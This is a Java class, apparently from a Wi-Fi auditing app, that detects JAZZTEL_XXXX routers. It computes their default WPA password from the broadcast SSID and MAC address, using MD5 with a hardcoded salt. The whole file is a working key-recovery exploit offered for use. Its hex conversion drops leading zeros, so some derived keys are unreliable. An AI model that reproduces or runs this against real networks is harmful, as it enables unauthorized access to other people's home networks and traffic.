package com.auditfi.vulnerables;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class JAZZTELXXXX{
	
	public static boolean esCompatible(String SSID, String BSSID){
		//Miramos si empieza por JAZZTEL_ y tiene 9 caracteres
		if (SSID.length()==12 && SSID.substring(0, 8).equals("JAZZTEL_")) 
			return true;
		else
			return false;
	}
	
	public static String obtenerClave(String SSID, String BSSID){
		String key;

		BSSID = BSSID.toUpperCase();
		BSSID = BSSID.replace(":", "");

		if (BSSID.length() != 12) {
			key = "MAC del router erronea";
		} else {
			SSID = SSID.toUpperCase();
			SSID = SSID.trim();

			// bcgbghgg + 4 primeros grupos de la mac + los ultimos 4 caracteres
			// de la ESSID + la mac
			key = md5("bcgbghgg" + BSSID.substring(0, 8) + SSID.substring(SSID.length() - 4) + BSSID);

			// O bien bcgbghgg + 5 primeros grupos de la mac + 2 ultimos
			// caracteres de la mac -3 + la mac

			key=key.substring(0, 20);

		}

		return key;
	}

	
	/*
	 * Calcula el md5 de una cadena de texto
	 */
	
	public static String md5(String s) {
		try {
			// Create MD5 Hash
			MessageDigest digest = java.security.MessageDigest
					.getInstance("MD5");
			digest.update(s.getBytes());
			byte messageDigest[] = digest.digest();

			// Create Hex String
			StringBuffer hexString = new StringBuffer();
			for (int i = 0; i < messageDigest.length; i++)
				hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
			return hexString.toString();

		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		}
		return "";
	}
	
}